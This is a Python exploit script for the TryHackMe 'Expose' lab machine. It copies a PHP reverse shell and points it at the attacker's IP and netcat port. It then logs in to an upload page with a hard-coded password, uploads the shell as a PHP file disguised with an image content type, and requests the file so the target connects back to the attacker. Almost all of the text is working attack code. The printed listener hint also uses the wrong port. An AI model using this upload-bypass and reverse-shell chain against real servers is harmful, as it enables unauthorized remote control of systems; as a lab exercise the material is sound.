# Script to get a direct reverse shell for "EXPOSE" Machine on @tryhackme
# author : rghackerx 
# happy hacking :)

import argparse
import requests
import time
import os

# Define the argument parser
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', required=True, help="URL to connect to")
parser.add_argument('-p', '--port', type=int, required=True, help="Webiste port number ; ex = 1337")
parser.add_argument('-a', '--aip', required=True, help="attacker's IP")
parser.add_argument('-nc', '--netcat', required=True, help="Netcat port")


args = parser.parse_args()

# shell generation 

os.system("cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php")

def update_php_reverse_shell(file_path, new_ip, new_port):
    # Read the original PHP reverse shell code
    with open(file_path, 'r') as file:
        php_code = file.readlines()

    # Update IP and Port in the code
    updated_code = []
    for line in php_code:
        if line.startswith('$ip ='):
            updated_code.append(f"$ip = '{new_ip}';\n")
        elif line.startswith('$port ='):
            updated_code.append(f"$port = {new_port};\n")
        else:
            updated_code.append(line)

    # Write the updated code back to the file
    with open(file_path, 'w') as file:
        file.writelines(updated_code)

# Example usage
file_path = '/tmp/shell.php'
new_ip = args.aip  # New IP address
new_port = args.netcat          # New port number

update_php_reverse_shell(file_path, new_ip, new_port)
print("[*]Reverse Shell Generated")


# Get the IP and port from the arguments
ip = args.url
port = args.port

# Create a session object to persist cookies
session = requests.Session()

# Define the URL for the password submission
url = f"http://{ip}:{port}/upload-cv00101011/"

# Define the headers for the first POST request
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": f"http://{ip}:{port}",
    "Connection": "keep-alive",
    "Referer": f"http://{ip}:{port}/upload-cv00101011/"
}

# Define the payload for the first POST request (authentication)
data = {
    'password': 'zeamkish'
}

response = session.post(url, headers=headers, data=data)

file_path = '/tmp/shell.php'

with open(file_path, 'rb') as f:
    files = {'file': ('rghx.php', f, 'image/png')}
    response = session.post(url, headers=headers, files=files)

print(f"[*]Run : rlwrap nc -nlvp {port}")
print("[*]Uploading Shell...")
time.sleep(2.5)
print("[*]Woop Woop! Enjoy your shell :- rghackerx")
# Print the response from the file upload
if "Maybe" in response.text:
    requests.get(url + "upload_thm_1001/rghx.php")
else:
    print("[*]Shell is not upladed! Try Again!")
    print("exiting...")
    exit()
